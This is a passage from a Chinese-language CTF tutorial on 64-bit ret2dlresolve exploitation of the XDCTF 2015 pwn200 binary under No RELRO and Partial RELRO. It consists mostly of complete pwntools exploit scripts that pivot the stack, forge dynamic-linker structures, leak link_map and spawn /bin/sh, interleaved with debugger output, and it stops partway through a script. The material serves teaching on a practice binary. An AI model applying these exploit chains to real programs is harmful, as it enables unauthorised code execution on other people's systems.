payload1 = csu(0, 1 ,elf.got['read'],0,new_stack,stack_size)
rop.raw(payload1)
rop.raw(0x400607)
assert(len(rop.chain())<=256)
rop.raw("a"*(256-len(rop.chain())))
gdb.attach(io)
io.send(rop.chain())

# construct fake stack
rop = ROP("./main_no_relro_64")
rop.raw(csu(0, 1 ,elf.got['read'],0,0x600988+8,8))  # modify .dynstr pointer in .dynamic section to a specific location
dynstr = elf.get_section_by_name('.dynstr').data()
dynstr = dynstr.replace("read","system")
rop.raw(csu(0, 1 ,elf.got['read'],0,0x600B30,len(dynstr)))  # construct a fake dynstr section
rop.raw(csu(0, 1 ,elf.got['read'],0,0x600B30+len(dynstr),len("/bin/sh\x00")))  # read /bin/sh\x00
rop.raw(0x0000000000400773) # pop rdi; ret
rop.raw(0x600B30+len(dynstr))
rop.raw(0x400516) # the second instruction of read@plt 
rop.raw(0xdeadbeef)
print(len(rop.chain()))
rop.raw('a'*(stack_size-len(rop.chain())))
io.send(rop.chain())


# reuse the vuln to stack pivot
rop = ROP("./main_no_relro_64")
rop.raw(offset*'a')
rop.migrate(new_stack)
assert(len(rop.chain())<=256)
io.send(rop.chain()+'a'*(256-len(rop.chain())))

# now, we are on the new stack
io.send(p64(0x600B30)) # fake dynstr location
io.send(dynstr) # fake dynstr
io.send("/bin/sh\x00")

io.interactive()
```

此時，我們發現程序又崩了，通過 coredump

```bash
❯ gdb -c core
```

我們發現，在處理 xmm 相關的指令時崩了

```
 ► 0x7fa8677a3396    movaps xmmword ptr [rsp + 0x40], xmm0
   0x7fa8677a339b    call   0x7fa8677931c0 <0x7fa8677931c0>
 
   0x7fa8677a33a0    lea    rsi, [rip + 0x39e259]
   0x7fa8677a33a7    xor    edx, edx
   0x7fa8677a33a9    mov    edi, 3
   0x7fa8677a33ae    call   0x7fa8677931c0 <0x7fa8677931c0>
 
   0x7fa8677a33b3    xor    edx, edx
   0x7fa8677a33b5    mov    rsi, rbp
   0x7fa8677a33b8    mov    edi, 2
   0x7fa8677a33bd    call   0x7fa8677931f0 <0x7fa8677931f0>
 
   0x7fa8677a33c2    mov    rax, qword ptr [rip + 0x39badf]
───────────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp  0x600d18 ◂— 0x0
01:0008│      0x600d20 —▸ 0x7fa8679080f7 ◂— 0x2f6e69622f00632d /* '-c' */
02:0010│      0x600d28 ◂— 0x0
03:0018│      0x600d30 —▸ 0x40076a ◂— pop    rbx
04:0020│      0x600d38 —▸ 0x7fa8677a3400 ◂— 0x9be1f8b53
05:0028│      0x600d40 —▸ 0x600d34 ◂— 0x677a340000000000
06:0030│      0x600d48 ◂— 0x8000000000000006
07:0038│      0x600d50 ◂— 0x0

```

由於 xmm 相關指令要求地址應該是 16 字節對齊的，而此時 rsp 並不是 16 字節對齊的。因此我們可以簡單地調整一下棧，來使得棧是 16 字節對齊的。

```python
from pwn import *
# context.log_level="debug"
# context.terminal = ["tmux","splitw","-h"]
context.arch="amd64"
io = process("./main_no_relro_64")
rop = ROP("./main_no_relro_64")
elf = ELF("./main_no_relro_64")

bss_addr = elf.bss()
csu_front_addr = 0x400750
csu_end_addr = 0x40076A
leave_ret  =0x40063c
poprbp_ret = 0x400588
def csu(rbx, rbp, r12, r13, r14, r15):
    # pop rbx, rbp, r12, r13, r14, r15
    # rbx = 0
    # rbp = 1, enable not to jump
    # r12 should be the function that you want to call
    # rdi = edi = r13d
    # rsi = r14
    # rdx = r15
    payload = p64(csu_end_addr)
    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
    payload += p64(csu_front_addr)
    payload += 'a' * 0x38
    return payload

io.recvuntil('Welcome to XDCTF2015~!\n')

# stack privot to bss segment, set rsp = new_stack
stack_size = 0x1a0 # new stack size is 0x1a0
new_stack = bss_addr+0x200

offset = 112+8
rop.raw(offset*'a')
payload1 = csu(0, 1 ,elf.got['read'],0,new_stack,stack_size)
rop.raw(payload1)
rop.raw(0x400607)
assert(len(rop.chain())<=256)
rop.raw("a"*(256-len(rop.chain())))
# gdb.attach(io)
io.send(rop.chain())

# construct fake stack
rop = ROP("./main_no_relro_64")
rop.raw(csu(0, 1 ,elf.got['read'],0,0x600988+8,8))  # modify .dynstr pointer in .dynamic section to a specific location
dynstr = elf.get_section_by_name('.dynstr').data()
dynstr = dynstr.replace("read","system")
rop.raw(csu(0, 1 ,elf.got['read'],0,0x600B30,len(dynstr)))  # construct a fake dynstr section
rop.raw(csu(0, 1 ,elf.got['read'],0,0x600B30+len(dynstr),len("/bin/sh\x00")))  # read /bin/sh\x00
rop.raw(0x0000000000400771) #pop rsi; pop r15; ret; 
rop.raw(0)
rop.raw(0)
rop.raw(0x0000000000400773) # pop rdi; ret
rop.raw(0x600B30+len(dynstr))
rop.raw(0x400516) # the second instruction of read@plt 
rop.raw(0xdeadbeef)
# print(len(rop.chain()))
rop.raw('a'*(stack_size-len(rop.chain())))
io.send(rop.chain())


# reuse the vuln to stack pivot
rop = ROP("./main_no_relro_64")
rop.raw(offset*'a')
rop.migrate(new_stack)
assert(len(rop.chain())<=256)
io.send(rop.chain()+'a'*(256-len(rop.chain())))

# now, we are on the new stack
io.send(p64(0x600B30)) # fake dynstr location
io.send(dynstr) # fake dynstr
io.send("/bin/sh\x00")

io.interactive()
```

最終執行效果如下

```
❯ python exp-no-relro-stack-pivot.py
[+] Starting local process './main_no_relro_64': pid 41149
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/64/no-relro/main_no_relro_64'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Loaded 14 cached gadgets for './main_no_relro_64'
[*] Switching to interactive mode
$ ls
exp-no-relro-stack-pivot.py  main_no_relro_64
```

到了這裏我們發現，與 32 位不同，在 64 位下進行棧遷移然後利用 ret2dlresolve 攻擊需要精心構造棧的位置，以避免破壞 .dynamic 節的內容。

這裏我們同時給出另外一種方法，即通過多次使用 vuln 函數進行漏洞利用。這種方式看起來會更加清晰一些。

```python
from pwn import *
# context.log_level="debug"
# context.terminal = ["tmux","splitw","-h"]
context.arch="amd64"
io = process("./main_no_relro_64")
elf = ELF("./main_no_relro_64")

bss_addr = elf.bss()
print(hex(bss_addr))
csu_front_addr = 0x400750
csu_end_addr = 0x40076A
leave_ret  =0x40063c
poprbp_ret = 0x400588
def csu(rbx, rbp, r12, r13, r14, r15):
    # pop rbx, rbp, r12, r13, r14, r15
    # rbx = 0
    # rbp = 1, enable not to jump
    # r12 should be the function that you want to call
    # rdi = edi = r13d
    # rsi = r14
    # rdx = r15
    payload = p64(csu_end_addr)
    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
    payload += p64(csu_front_addr)
    payload += 'a' * 0x38
    return payload

io.recvuntil('Welcome to XDCTF2015~!\n')

# stack privot to bss segment, set rsp = new_stack
stack_size = 0x200 # new stack size is 0x200
new_stack = bss_addr+0x100

# modify .dynstr pointer in .dynamic section to a specific location
rop = ROP("./main_no_relro_64")
offset = 112+8
rop.raw(offset*'a')
rop.raw(csu(0, 1 ,elf.got['read'],0,0x600988+8,8))  
rop.raw(0x400607)
rop.raw("a"*(256-len(rop.chain())))
print(rop.dump())
print(len(rop.chain()))
assert(len(rop.chain())<=256)
rop.raw("a"*(256-len(rop.chain())))
io.send(rop.chain())
io.send(p64(0x600B30+0x100))


# construct a fake dynstr section
rop = ROP("./main_no_relro_64")
rop.raw(offset*'a')
dynstr = elf.get_section_by_name('.dynstr').data()
dynstr = dynstr.replace("read","system")
rop.raw(csu(0, 1 ,elf.got['read'],0,0x600B30+0x100,len(dynstr)))  
rop.raw(0x400607)
rop.raw("a"*(256-len(rop.chain())))
io.send(rop.chain())
io.send(dynstr)

# read /bin/sh\x00
rop = ROP("./main_no_relro_64")
rop.raw(offset*'a')
rop.raw(csu(0, 1 ,elf.got['read'],0,0x600B30+0x100+len(dynstr),len("/bin/sh\x00")))  
rop.raw(0x400607)
rop.raw("a"*(256-len(rop.chain())))
io.send(rop.chain())
io.send("/bin/sh\x00")


rop = ROP("./main_no_relro_64")
rop.raw(offset*'a')
rop.raw(0x0000000000400771) #pop rsi; pop r15; ret; 
rop.raw(0)
rop.raw(0)
rop.raw(0x0000000000400773)
rop.raw(0x600B30+0x100+len(dynstr))
rop.raw(0x400516) # the second instruction of read@plt 
rop.raw(0xdeadbeef)
rop.raw('a'*(256-len(rop.chain())))
print(rop.dump())
print(len(rop.chain()))
io.send(rop.chain())
io.interactive()
```

### Partial RELRO

還是利用 2015 年 xdctf 的 pwn200 進行介紹。

```shell
❯ gcc -fno-stack-protector -z relro  -no-pie ../../main.c -o main_partial_relro_64
❯ checksec main_partial_relro_64
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/64/partial-relro/main_partial_relro_64'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

這裏我們仍然以手工構造和基於工具構造兩種方式來介紹 64 位下的 ret2dlresolve。

#### 手工僞造

這裏我們就不一步步展示了。直接採用最終的思路。

##### 64 位的變化

首先，我們先來看一下 64 位中的一些變化。

glibc 中默認編譯使用的是 `ELF_Rela` 來記錄重定位項的內容

```c
typedef struct
{
  Elf64_Addr        r_offset;                /* Address */
  Elf64_Xword        r_info;                        /* Relocation type and symbol index */
  Elf64_Sxword        r_addend;                /* Addend */
} Elf64_Rela;
/* How to extract and insert information held in the r_info field.  */
#define ELF64_R_SYM(i)                        ((i) >> 32)
#define ELF64_R_TYPE(i)                        ((i) & 0xffffffff)
#define ELF64_R_INFO(sym,type)                ((((Elf64_Xword) (sym)) << 32) + (type))
```

這裏 Elf64_Addr、Elf64_Xword、Elf64_Sxword 都爲 64 位，因此 Elf64_Rela 結構體的大小爲 24 字節。

根據 IDA 裏的重定位表的信息可以知道，write 函數在符號表中的偏移爲 1（0x100000007h>>32） 。

```assembly
LOAD:0000000000400488 ; ELF JMPREL Relocation Table
LOAD:0000000000400488                 Elf64_Rela <601018h, 100000007h, 0> ; R_X86_64_JUMP_SLOT write
LOAD:00000000004004A0                 Elf64_Rela <601020h, 200000007h, 0> ; R_X86_64_JUMP_SLOT strlen
LOAD:00000000004004B8                 Elf64_Rela <601028h, 300000007h, 0> ; R_X86_64_JUMP_SLOT setbuf
LOAD:00000000004004D0                 Elf64_Rela <601030h, 400000007h, 0> ; R_X86_64_JUMP_SLOT read
LOAD:00000000004004D0 LOAD            ends
```

確實在符號表中的偏移爲 1。

```shell
LOAD:00000000004002C0 ; ELF Symbol Table
LOAD:00000000004002C0      Elf64_Sym <0>
LOAD:00000000004002D8      Elf64_Sym <offset aWrite - offset byte_400398, 12h, 0, 0, 0, 0> ; "write"
LOAD:00000000004002F0      Elf64_Sym <offset aStrlen - offset byte_400398, 12h, 0, 0, 0, 0> ; "strlen"
LOAD:0000000000400308      Elf64_Sym <offset aSetbuf - offset byte_400398, 12h, 0, 0, 0, 0> ; "setbuf"
LOAD:0000000000400320      Elf64_Sym <offset aRead - offset byte_400398, 12h, 0, 0, 0, 0> ; "read"
...
```

在 64 位下，Elf64_Sym 結構體爲

```c
typedef struct
{
  Elf64_Word        st_name;                /* Symbol name (string tbl index) */
  unsigned char        st_info;                /* Symbol type and binding */
  unsigned char st_other;                /* Symbol visibility */
  Elf64_Section        st_shndx;                /* Section index */
  Elf64_Addr        st_value;                /* Symbol value */
  Elf64_Xword        st_size;                /* Symbol size */
} Elf64_Sym;
```

其中

- Elf64_Word 32 位
- Elf64_Section 16 位
- Elf64_Addr 64 位
- Elf64_Xword 64位

所以，Elf64_Sym 的大小爲 24 個字節。

除此之外，在 64 位下，plt 中的代碼 push 的是待解析符號在重定位表中的索引，而不是偏移。比如，write 函數 push 的是 0。

```assembly
.plt:0000000000400510 ; ssize_t write(int fd, const void *buf, size_t n)
.plt:0000000000400510 _write          proc near               ; CODE XREF: main+B3↓p
.plt:0000000000400510                 jmp     cs:off_601018
.plt:0000000000400510 _write          endp
.plt:0000000000400510
.plt:0000000000400516 ; ---------------------------------------------------------------------------
.plt:0000000000400516                 push    0
.plt:000000000040051B                 jmp     sub_400500
```

##### First Try - leak

根據上述的分析，我們可以寫出如下腳本

```python
from pwn import *
# context.log_level="debug"
# context.terminal = ["tmux","splitw","-h"]
context.arch="amd64"
io = process("./main_partial_relro_64")
elf = ELF("./main_partial_relro_64")

bss_addr = elf.bss()
csu_front_addr = 0x400780
csu_end_addr = 0x40079A
vuln_addr = 0x400637

def csu(rbx, rbp, r12, r13, r14, r15):
    # pop rbx, rbp, r12, r13, r14, r15
    # rbx = 0
    # rbp = 1, enable not to jump
    # r12 should be the function that you want to call
    # rdi = edi = r13d
    # rsi = r14
    # rdx = r15
    payload = p64(csu_end_addr)
    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
    payload += p64(csu_front_addr)
    payload += 'a' * 0x38
    return payload


def ret2dlresolve_x64(elf, store_addr, func_name, resolve_addr):
    plt0 = elf.get_section_by_name('.plt').header.sh_addr
    
    rel_plt = elf.get_section_by_name('.rela.plt').header.sh_addr
    relaent = elf.dynamic_value_by_tag("DT_RELAENT") # reloc entry size

    dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
    syment = elf.dynamic_value_by_tag("DT_SYMENT") # symbol entry size

    dynstr = elf.get_section_by_name('.dynstr').header.sh_addr

    # construct fake function string
    func_string_addr = store_addr
    resolve_data = func_name + "\x00"
    
    # construct fake symbol
    symbol_addr = store_addr+len(resolve_data)
    offset = symbol_addr - dynsym
    pad = syment - offset % syment # align syment size
    symbol_addr = symbol_addr+pad
    symbol = p32(func_string_addr-dynstr)+p8(0x12)+p8(0)+p16(0)+p64(0)+p64(0)
    symbol_index = (symbol_addr - dynsym)/24
    resolve_data +='a'*pad
    resolve_data += symbol

    # construct fake reloc 
    reloc_addr = store_addr+len(resolve_data)
    offset = reloc_addr - rel_plt
    pad = relaent - offset % relaent # align relaent size
    reloc_addr +=pad
    reloc_index = (reloc_addr-rel_plt)/24
    rinfo = (symbol_index<<32) | 7
    write_reloc = p64(resolve_addr)+p64(rinfo)+p64(0)
    resolve_data +='a'*pad
    resolve_data +=write_reloc
    
    resolve_call = p64(plt0) + p64(reloc_index)
    return resolve_data, resolve_call
    

io.recvuntil('Welcome to XDCTF2015~!\n')
gdb.attach(io)

store_addr = bss_addr+0x100

# construct fake string, symbol, reloc.modify .dynstr pointer in .dynamic section to a specific location
rop = ROP("./main_partial_relro_64")
offset = 112+8
rop.raw(offset*'a')
resolve_data, resolve_call = ret2dlresolve_x64(elf, store_addr, "system",elf.got["write"])
rop.raw(csu(0, 1 ,elf.got['read'],0,store_addr,len(resolve_data)))  
rop.raw(vuln_addr)
rop.raw("a"*(256-len(rop.chain())))
assert(len(rop.chain())<=256)
io.send(rop.chain())
# send resolve data
io.send(resolve_data)

rop = ROP("./main_partial_relro_64")
rop.raw(offset*'a')
sh = "/bin/sh\x00"
bin_sh_addr = store_addr+len(resolve_data)
rop.raw(csu(0, 1 ,elf.got['read'],0,bin_sh_addr,len(sh)))
rop.raw(vuln_addr)
rop.raw("a"*(256-len(rop.chain())))
io.send(rop.chain())
io.send(sh)


rop = ROP("./main_partial_relro_64")
rop.raw(offset*'a')
rop.raw(0x00000000004007a3) # 0x00000000004007a3: pop rdi; ret; 
rop.raw(bin_sh_addr)
rop.raw(resolve_call)
rop.raw('a'*(256-len(rop.chain())))
io.send(rop.chain())
io.interactive()
```

然而， 簡單地運行後發現，程序崩潰了。

```
─────────────────────────────────[ REGISTERS ]──────────────────────────────────
*RAX  0x4003f6 ◂— 0x2000200020000
*RBX  0x601018 (_GLOBAL_OFFSET_TABLE_+24) —▸ 0x7fe00aa8e250 (write) ◂— lea    rax, [rip + 0x2e06a1]
*RCX  0x155f100000007
*RDX  0x155f1
*RDI  0x400398 ◂— 0x6f732e6362696c00
*RSI  0x601158 ◂— 0x1200200db8
*R8   0x0
 R9   0x7fe00af7a4c0 ◂— 0x7fe00af7a4c0
*R10  0x7fe00af98170 ◂— 0x0
 R11  0x246
*R12  0x6161616161616161 ('aaaaaaaa')
*R13  0x6161616161616161 ('aaaaaaaa')
*R14  0x6161616161616161 ('aaaaaaaa')
*R15  0x6161616161616161 ('aaaaaaaa')
*RBP  0x6161616161616161 ('aaaaaaaa')
*RSP  0x7fffb43c82a0 ◂— 0x0
*RIP  0x7fe00ad7eeb4 (_dl_fixup+116) ◂— movzx  eax, word ptr [rax + rdx*2]
───────────────────────────────────[ DISASM ]───────────────────────────────────
 ► 0x7fe00ad7eeb4 <_dl_fixup+116>    movzx  eax, word ptr [rax + rdx*2]
   0x7fe00ad7eeb8 <_dl_fixup+120>    and    eax, 0x7fff
   0x7fe00ad7eebd <_dl_fixup+125>    lea    rdx, [rax + rax*2]
   0x7fe00ad7eec1 <_dl_fixup+129>    mov    rax, qword ptr [r10 + 0x2e0]
   0x7fe00ad7eec8 <_dl_fixup+136>    lea    r8, [rax + rdx*8]
   0x7fe00ad7eecc <_dl_fixup+140>    mov    eax, 0
   0x7fe00ad7eed1 <_dl_fixup+145>    mov    r9d, dword ptr [r8 + 8]
   0x7fe00ad7eed5 <_dl_fixup+149>    test   r9d, r9d
   0x7fe00ad7eed8 <_dl_fixup+152>    cmove  r8, rax
   0x7fe00ad7eedc <_dl_fixup+156>    mov    edx, dword ptr fs:[0x18]
   0x7fe00ad7eee4 <_dl_fixup+164>    test   edx, edx
```

通過調試，我們發現，程序是在獲取對應的版本號

- rax 爲 0x4003f6，指向版本號數組
- rdx 爲 0x155f1，符號表索引，同時爲版本號索引

同時 rax + rdx*2 爲 0x42afd8，而這個地址並不在映射的內存中。

```
pwndbg> print /x $rax + $rdx*2
$1 = 0x42afd8
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
          0x400000           0x401000 r-xp     1000 0      /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/64/partial-relro/main_partial_relro_64
          0x600000           0x601000 r--p     1000 0      /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/64/partial-relro/main_partial_relro_64
          0x601000           0x602000 rw-p     1000 1000   /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/64/partial-relro/main_partial_relro_64
    0x7fe00a97e000     0x7fe00ab65000 r-xp   1e7000 0      /lib/x86_64-linux-gnu/libc-2.27.so
    0x7fe00ab65000     0x7fe00ad65000 ---p   200000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7fe00ad65000     0x7fe00ad69000 r--p     4000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7fe00ad69000     0x7fe00ad6b000 rw-p     2000 1eb000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7fe00ad6b000     0x7fe00ad6f000 rw-p     4000 0      
    0x7fe00ad6f000     0x7fe00ad96000 r-xp    27000 0      /lib/x86_64-linux-gnu/ld-2.27.so
    0x7fe00af79000     0x7fe00af7b000 rw-p     2000 0      
    0x7fe00af96000     0x7fe00af97000 r--p     1000 27000  /lib/x86_64-linux-gnu/ld-2.27.so
    0x7fe00af97000     0x7fe00af98000 rw-p     1000 28000  /lib/x86_64-linux-gnu/ld-2.27.so
    0x7fe00af98000     0x7fe00af99000 rw-p     1000 0      
    0x7fffb43a9000     0x7fffb43cb000 rw-p    22000 0      [stack]
    0x7fffb43fb000     0x7fffb43fe000 r--p     3000 0      [vvar]
    0x7fffb43fe000     0x7fffb4400000 r-xp     2000 0      [vdso]
0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]
```

那我們能不能想辦法讓它位於映射的內存中呢。估計有點難

- bss 的起始地址爲 0x601050，那麼索引值最小爲 (0x601050-0x400398)/24=87517，即 0x4003f6 + 87517*2 = 0x42afb0
- bss 可以最大使用的地址爲 0x601fff，對應的索引值爲(0x601fff-0x400398)/24=87684，即0x4003f6 + 87684*2 = 0x42b0fe

顯然都在非映射的內存區域。因此，我們得考慮考慮其它辦法。通過閱讀 dl_fixup 的代碼

```c
        // 獲取符號的版本信息
        const struct r_found_version *version = NULL;
        if (l->l_info[VERSYMIDX(DT_VERSYM)] != NULL)
        {
            const ElfW(Half) *vernum = (const void *)D_PTR(l, l_info[VERSYMIDX(DT_VERSYM)]);
            ElfW(Half) ndx = vernum[ELFW(R_SYM)(reloc->r_info)] & 0x7fff;
            version = &l->l_versions[ndx];
            if (version->hash == 0)
                version = NULL;
        }
```

我們發現，如果把 l->l_info[VERSYMIDX(DT_VERSYM)] 設置爲 NULL，那程序就不會執行下面的代碼，版本號就爲 NULL，就可以正常執行代碼。但是，這樣的話，我們就需要知道 link_map 的地址了。 GOT 表的第 0 項（本例中 0x601008）存儲的就是 link_map 的地址。

因此，我們可以

- 泄露該處的地址
- 將 l->l_info[VERSYMIDX(DT_VERSYM)] 設置爲 NULL
- 最後執行利用腳本即可

通過彙編代碼，我們可以看出 l->l_info[VERSYMIDX(DT_VERSYM)] 的偏移爲 0x1c8

```assembly
 ► 0x7fa4b09f7ea1 <_dl_fixup+97>     mov    rax, qword ptr [r10 + 0x1c8]
   0x7fa4b09f7ea8 <_dl_fixup+104>    xor    r8d, r8d
   0x7fa4b09f7eab <_dl_fixup+107>    test   rax, rax
   0x7fa4b09f7eae <_dl_fixup+110>    je     _dl_fixup+156 <_dl_fixup+156>
```

因此，我們可以簡單修改下 exp。

```python
from pwn import *
# context.log_level="debug"
# context.terminal = ["tmux","splitw","-h"]
context.arch="amd64"
io = process("./main_partial_relro_64")
elf = ELF("./main_partial_relro_64")

bss_addr = elf.bss()
csu_front_addr = 0x400780
csu_end_addr = 0x40079A
vuln_addr = 0x400637

def csu(rbx, rbp, r12, r13, r14, r15):
    # pop rbx, rbp, r12, r13, r14, r15
    # rbx = 0
    # rbp = 1, enable not to jump
    # r12 should be the function that you want to call
    # rdi = edi = r13d
    # rsi = r14
    # rdx = r15
    payload = p64(csu_end_addr)
    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
    payload += p64(csu_front_addr)
    payload += 'a' * 0x38
    return payload


def ret2dlresolve_x64(elf, store_addr, func_name, resolve_addr):
    plt0 = elf.get_section_by_name('.plt').header.sh_addr
    
    rel_plt = elf.get_section_by_name('.rela.plt').header.sh_addr
    relaent = elf.dynamic_value_by_tag("DT_RELAENT") # reloc entry size

    dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
    syment = elf.dynamic_value_by_tag("DT_SYMENT") # symbol entry size

    dynstr = elf.get_section_by_name('.dynstr').header.sh_addr


    # construct fake function string
    func_string_addr = store_addr
    resolve_data = func_name + "\x00"
    
    # construct fake symbol
    symbol_addr = store_addr+len(resolve_data)
    offset = symbol_addr - dynsym
    pad = syment - offset % syment # align syment size
    symbol_addr = symbol_addr+pad
    symbol = p32(func_string_addr-dynstr)+p8(0x12)+p8(0)+p16(0)+p64(0)+p64(0)
    symbol_index = (symbol_addr - dynsym)/24
    resolve_data +='a'*pad
    resolve_data += symbol

    # construct fake reloc 
    reloc_addr = store_addr+len(resolve_data)
    offset = reloc_addr - rel_plt
    pad = relaent - offset % relaent # align relaent size
    reloc_addr +=pad
    reloc_index = (reloc_addr-rel_plt)/24
    rinfo = (symbol_index<<32) | 7
    write_reloc = p64(resolve_addr)+p64(rinfo)+p64(0)
    resolve_data +='a'*pad
    resolve_data +=write_reloc
    
    resolve_call = p64(plt0) + p64(reloc_index)
    return resolve_data, resolve_call
    

io.recvuntil('Welcome to XDCTF2015~!\n')
gdb.attach(io)

store_addr = bss_addr+0x100

# construct fake string, symbol, reloc.modify .dynstr pointer in .dynamic section to a specific location
rop = ROP("./main_partial_relro_64")
offset = 112+8
rop.raw(offset*'a')
resolve_data, resolve_call = ret2dlresolve_x64(elf, store_addr, "system",elf.got["write"])
rop.raw(csu(0, 1 ,elf.got['read'],0,store_addr,len(resolve_data)))  
rop.raw(vuln_addr)
rop.raw("a"*(256-len(rop.chain())))
assert(len(rop.chain())<=256)
io.send(rop.chain())
# send resolve data
io.send(resolve_data)

rop = ROP("./main_partial_relro_64")
rop.raw(offset*'a')
sh = "/bin/sh\x00"
bin_sh_addr = store_addr+len(resolve_data)
rop.raw(csu(0, 1 ,elf.got['read'],0,bin_sh_addr,len(sh)))
rop.raw(vuln_addr)
rop.raw("a"*(256-len(rop.chain())))
io.send(rop.chain())
io.send(sh)


# leak link_map addr
rop = ROP("./main_partial_relro_64")
rop.raw(offset*'a')
rop.raw(csu(0, 1 ,elf.got['write'],1,0x601008,8))
rop.raw(vuln_addr)
rop.raw("a"*(256-len(rop.chain())))
io.send(rop.chain())
link_map_addr = u64(io.recv(8))
print(hex(link_map_addr))


# set l->l_info[VERSYMIDX(DT_VERSYM)] =  NULL
rop = ROP("./main_partial_relro_64")
rop.raw(offset*'a')
rop.raw(csu(0, 1 ,elf.got['read'],0,link_map_addr+0x1c8,8))
rop.raw(vuln_addr)
rop.raw("a"*(256-len(rop.chain())))
io.send(rop.chain())
io.send(p64(0))


rop = ROP("./main_partial_relro_64")
rop.raw(offset*'a')
rop.raw(0x00000000004007a3) # 0x00000000004007a3: pop rdi; ret; 
rop.raw(bin_sh_addr)
rop.raw(resolve_call)
# rop.raw('a'*(256-len(rop.chain())))
io.send(rop.chain())
io.interactive()
```

然鵝，還是崩潰。但這次比較好的是，確實已經執行到了 system 函數。通過調試，我們可以發現，system 函數在進一步調用 execve 時出現了問題

```assembly
 ► 0x7f7f3f74d3ec <do_system+1180>       call   execve <execve>
        path: 0x7f7f3f8b20fa ◂— 0x68732f6e69622f /* '/bin/sh' */
        argv: 0x7ffe63677000 —▸ 0x7f7f3f8b20ff ◂— 0x2074697865006873 /* 'sh' */
        envp: 0x7ffe636770a8 ◂— 0x10000
```

即環境變量的地址指向了一個莫名的地址，這應該是我們在進行 ROP 的時候破壞了棧上的數據。那我們可以調整調整，使其爲 NULL 或者儘可能不破壞原有的數據。這裏我們選擇使其爲 NULL。

首先，我們可以把讀僞造的數據和 /bin/sh 部分的 rop 合併起來，以減少 ROP 的次數

```python
from pwn import *
# context.log_level="debug"
# context.terminal = ["tmux","splitw","-h"]
context.arch="amd64"
io = process("./main_partial_relro_64")
elf = ELF("./main_partial_relro_64")

bss_addr = elf.bss()
csu_front_addr = 0x400780
csu_end_addr = 0x40079A
vuln_addr = 0x400637

def csu(rbx, rbp, r12, r13, r14, r15):
    # pop rbx, rbp, r12, r13, r14, r15
    # rbx = 0
    # rbp = 1, enable not to jump
    # r12 should be the function that you want to call
    # rdi = edi = r13d
    # rsi = r14
    # rdx = r15
    payload = p64(csu_end_addr)
    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
    payload += p64(csu_front_addr)
    payload += 'a' * 0x38
    return payload


def ret2dlresolve_x64(elf, store_addr, func_name, resolve_addr):
    plt0 = elf.get_section_by_name('.plt').header.sh_addr
    
    rel_plt = elf.get_section_by_name('.rela.plt').header.sh_addr
    relaent = elf.dynamic_value_by_tag("DT_RELAENT") # reloc entry size

    dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
    syment = elf.dynamic_value_by_tag("DT_SYMENT") # symbol entry size

    dynstr = elf.get_section_by_name('.dynstr').header.sh_addr


    # construct fake function string
    func_string_addr = store_addr
    resolve_data = func_name + "\x00"
    
    # construct fake symbol
    symbol_addr = store_addr+len(resolve_data)
    offset = symbol_addr - dynsym
    pad = syment - offset % syment # align syment size
    symbol_addr = symbol_addr+pad
    symbol = p32(func_string_addr-dynstr)+p8(0x12)+p8(0)+p16(0)+p64(0)+p64(0)
    symbol_index = (symbol_addr - dynsym)/24
    resolve_data +='a'*pad
    resolve_data += symbol

    # construct fake reloc 
    reloc_addr = store_addr+len(resolve_data)
    offset = reloc_addr - rel_plt
    pad = relaent - offset % relaent # align relaent size
    reloc_addr +=pad
    reloc_index = (reloc_addr-rel_plt)/24
    rinfo = (symbol_index<<32) | 7
    write_reloc = p64(resolve_addr)+p64(rinfo)+p64(0)
    resolve_data +='a'*pad
    resolve_data +=write_reloc
    
    resolve_call = p64(plt0) + p64(reloc_index)
    return resolve_data, resolve_call
    

io.recvuntil('Welcome to XDCTF2015~!\n')
gdb.attach(io)

store_addr = bss_addr+0x100
sh = "/bin/sh\x00"

# construct fake string, symbol, reloc.modify .dynstr pointer in .dynamic section to a specific location
rop = ROP("./main_partial_relro_64")
offset = 112+8
rop.raw(offset*'a')
resolve_data, resolve_call = ret2dlresolve_x64(elf, store_addr, "system",elf.got["write"])
rop.raw(csu(0, 1 ,elf.got['read'],0,store_addr,len(resolve_data)+len(sh)))  
rop.raw(vuln_addr)
rop.raw("a"*(256-len(rop.chain())))
assert(len(rop.chain())<=256)
io.send(rop.chain())
# send resolve data
io.send(resolve_data+sh)
bin_sh_addr = store_addr+len(resolve_data)


# rop = ROP("./main_partial_relro_64")
# rop.raw(offset*'a')
# sh = "/bin/sh\x00"
# bin_sh_addr = store_addr+len(resolve_data)
# rop.raw(csu(0, 1 ,elf.got['read'],0,bin_sh_addr,len(sh)))
# rop.raw(vuln_addr)
# rop.raw("a"*(256-len(rop.chain())))
# io.send(rop.chain())
# io.send(sh)


# leak link_map addr
rop = ROP("./main_partial_relro_64")
rop.raw(offset*'a')
rop.raw(csu(0, 1 ,elf.got['write'],1,0x601008,8))
rop.raw(vuln_addr)
